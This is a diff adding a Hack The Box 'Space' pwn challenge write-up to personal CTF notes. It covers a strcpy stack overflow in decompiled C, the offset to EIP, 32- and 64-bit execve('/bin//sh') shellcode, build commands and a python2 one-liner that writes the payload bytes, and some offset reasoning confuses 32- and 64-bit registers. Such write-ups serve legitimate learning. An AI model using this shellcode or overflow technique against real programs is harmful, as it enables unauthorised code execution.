@@ -4,6 +4,103 @@
 
 ## Pwn
 
+### Space
+
+[Space](https://app.hackthebox.eu/challenges/Space)
+
+**Challenge info**: roaming in a small space
+
+```c
+
+/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
+
+
+void vuln(char *param_1)
+
+{
+  char local_12 [10];
+  
+  strcpy(local_12,param_1);
+  return;
+}
+
+undefined4 main(void)
+
+{
+  undefined local_2f [31];
+  undefined *local_10;
+  
+  local_10 = &stack0x00000004;
+  printf("> ");
+  fflush(stdout);
+  read(0,local_2f,0x1f);
+  vuln(local_2f);
+  return 0;
+}
+```
+
+- Instruction pointer is at `0xffffd02c` filled with `0x08049231` (the address of the next instruction after `vuln()`)
+
+- There is 18 bytes worth space before the EIP and 31 - (18 + 4) = 9 bytes. Another way to think about this: 10 bytes of buffer + 4 bytes overflow in EBP + 4 bytes overflow in ESP = 18 bytes to reach RIP
+
+One shellcode that works independently in the context:
+
+```s
+.global _start
+_start:
+.intel_syntax noprefix
+
+L1:    mov rcx, 0xFF978CD091969DD0
+L2: not rcx
+    xor rsi, rsi
+    jmp label
+    .byte 0x41
+    .byte 0xd0
+    .byte 0xff
+    .byte 0xff
+label: 
+    push rcx
+    mov rdi, rsp
+    mov al, 0x3b
+    syscall
+```
+
+However, the stack fills things in `ecx` and the rest 4 bytes (instead of going in ecx) go as data and insert a segmentation fault. This is a 32 bit binary and should be treated as such. To be honest, the register file in gdb should have been the giveaway that the binary was 32 bit
+
+```s
+[SECTION .text]
+global _start
+_start:
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    jmp label
+    nop
+    nop
+    nop
+     nop
+label: 
+    
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    xor edx, edx
+    int 0x80
+```
+
+And compile it with:
+
+- `nasm -f elf32 -l 32bit_shellcode 32bit_shellcode.asm`
+
+- `ld -m elf_i386 32bit_shellcode.o -o 32bit_shellcode`
+
+- Now execute it with `./32bit_shellcode`
+
+Generate payload: `python2 -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xeb\x04' + '\x41\xd0\xff\xff' + '\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80')" > payload`
+
 ### You Know 0xDiaboles
 
 [Diablos](https://app.hackthebox.eu/challenges/You-know-0xDiablos)
